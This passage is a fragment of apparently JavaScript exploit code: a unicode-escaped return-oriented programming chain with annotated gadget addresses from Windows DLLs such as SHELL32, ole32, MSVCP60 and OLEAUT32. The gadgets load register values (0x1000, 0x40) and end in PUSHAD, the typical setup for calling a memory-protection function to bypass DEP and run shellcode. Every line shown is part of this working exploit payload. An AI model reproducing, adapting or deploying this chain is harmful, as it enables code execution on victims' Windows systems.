    "%uffff%uffff" + // 0xffffffff : ,# Value to negate, will become 0x00000001
    "%u0cb6%u7640" + // 0x76400cb6 : ,# NEG EAX # RETN [SHELL32.dll] ** REBASED ** ASLR 
    "%u27c9%u7725" + // 0x772527c9 : ,# XCHG EAX,EBX # RETN [ole32.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u648b%u7178" + // 0x7178648b : ,# POP EAX # RETN [MSVCP60.dll] ** REBASED ** ASLR 
    "%udc8a%ua03f" + // 0xa03fdc8a : ,# put delta into eax (-> put 0x00001000 into edx)
    "%u400c%u762e" + // 0x762e400c : ,# ADD EAX,5FC03376 # INC EAX # POP ESI # POP EBP # RETN 0x08 [SHELL32.dll] ** REBASED ** ASLR 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u5b2e%u74f3" + // 0x74f35b2e : ,# XCHG EAX,EDX # RETN [DNSAPI.dll] ** REBASED ** ASLR 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u603c%u7178" + // 0x7178603c : ,# POP EAX # RETN [MSVCP60.dll] ** REBASED ** ASLR 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%u1643%u75e0" + // 0x75e01643 : ,# NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    "%u36b6%u7717" + // 0x771736b6 : ,# XCHG EAX,ECX # RETN [ole32.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u4445%u5f46" + // 0x5f464445 : ,# POP EDI # RETN [SLMFC.DLL] 
    "%u6a92%u76e2" + // 0x76e26a92 : ,# RETN (ROP NOP) [SHLWAPI.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u7301%u7722" + // 0x77227301 : ,# POP EAX # RETN [ole32.dll] ** REBASED ** ASLR 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u8638%u75c5" + // 0x75c58638 : ,# PUSHAD # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
    ""); //  : 


--------------------------------------------------------------------------------------------------

